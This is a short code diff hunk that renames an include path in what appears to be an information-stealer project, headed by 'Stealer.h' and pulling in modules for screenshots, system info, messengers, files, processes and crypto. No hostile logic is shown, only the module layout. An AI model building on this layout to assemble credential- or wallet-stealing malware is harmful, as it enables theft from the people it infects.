@@ -5,7 +5,7 @@
 #include "Stealer.h"
 #include "impl/Screenshot.h"
 #include "impl/Info.h"
-#include "impl/socials/Socials.h"
+#include "impl/messengers/Socials.h"
 #include "impl/files/Files.h"
 #include "impl/Processes.h"
 #include "impl/crypto/Crypto.h"
